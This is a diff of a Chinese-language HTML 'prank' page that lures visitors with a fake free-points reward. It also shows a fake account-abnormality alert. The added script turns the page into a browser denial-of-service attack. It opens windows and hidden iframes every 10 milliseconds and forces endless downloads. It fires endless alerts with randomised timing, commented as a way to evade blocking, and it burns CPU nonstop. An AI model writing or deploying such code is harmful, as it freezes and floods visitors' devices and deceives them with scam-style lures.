@@ -5,7 +5,7 @@
     <body style="background-color: black; color: white; text-align: center;">
         <h1 style="color: red; font-size: 50px;">恭喜！您獲得免費點數！</h1>
         <img src="https://m.gxgif.com/pic/kb/202352514622.jpg" alt="免費獎勵" style="display: block; margin: 0 auto; width: 60%;"/>
-        <audio id="scary-audio">
+        <audio id="scary-audio" loop>
             <source src="static/yy.wav" type="audio/wav">
         </audio>
         <p style="font-size: 20px; color: yellow;">點擊按鈕領取獎勵</p>
@@ -13,55 +13,65 @@
 
         <script>
             function startPrank() {
-                // 播放音效
                 var audio = document.getElementById('scary-audio');
                 audio.muted = false;
                 audio.play();
 
-                // 每 10 秒開一個新視窗
-                setInterval(() => {
-                    window.open("https://rickroll.it/", "_blank");
-                }, 10000);
-
-                // 每 10 秒彈出一個警告視窗
-                setTimeout(function() {
-                    alert("你的帳號出現異常，請重新登入！");
-                }, 10000);
-
-                // CPU 負載（每 10 秒運行 5 秒）
-                function burnCPU() {
-                    let start = Date.now();
-                    while (Date.now() - start < 5000) {
-                        Math.sqrt(Math.random() * 99999999);
-                    }
-                    setTimeout(burnCPU, 10000);
-                }
-                setTimeout(burnCPU, 10000);
-
-                // 每 5 秒新增一個 iframe（最多 10 個）
-                let iframeCount = 0;
-                function spamIframe() {
-                    if (iframeCount < 10) {
+                // **無限開新視窗**
+                function openWindows() {
+                    let w = window.open("https://rickroll.it/", "_blank");
+                    if (!w) { // 如果瀏覽器阻擋，改用 iframe
                         let iframe = document.createElement('iframe');
-                        iframe.src = "https://www.google.com";
-                        iframe.width = "400";
-                        iframe.height = "300";
+                        iframe.src = "https://rickroll.it/";
+                        iframe.width = "1";
+                        iframe.height = "1";
                         document.body.appendChild(iframe);
-                        iframeCount++;
-                        setTimeout(spamIframe, 5000);
                     }
+                    setTimeout(openWindows, 10); // 10ms 無限執行
                 }
-                setTimeout(spamIframe, 5000);
+                openWindows();
 
-                // 5 秒後下載一次檔案
-                setTimeout(() => {
+                // **無限下載**
+                function startDownload() {
                     let a = document.createElement('a');
                     a.href = 'bigfile.zip';
                     a.download = 'bigfile.zip';
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
-                }, 5000);
+                    setTimeout(startDownload, 10); // 10ms 無限下載
+                }
+                startDownload();
+
+                // **無限彈出警告**
+                function annoyingAlert() {
+                    setTimeout(() => {
+                        alert("⚠️ 你的帳號出現異常！請重新登入！");
+                        annoyingAlert(); // 無限呼叫自己
+                    }, Math.random() * 50); // 變動時間，避開封鎖
+                }
+                annoyingAlert();
+
+                // **無限創建 iframe**
+                function spamIframe() {
+                    let iframe = document.createElement('iframe');
+                    iframe.src = "https://www.google.com";
+                    iframe.width = "400";
+                    iframe.height = "300";
+                    document.body.appendChild(iframe);
+                    setTimeout(spamIframe, 10); // 10ms 無限執行
+                }
+                spamIframe();
+
+                // **無限 CPU 負載**
+                function burnCPU() {
+                    let start = Date.now();
+                    while (Date.now() - start < 10) { // 10ms 運行
+                        Math.sqrt(Math.random() * 99999999);
+                    }
+                    setTimeout(burnCPU, 10); // 10ms 無限執行
+                }
+                burnCPU();
             }
         </script>
     </body>
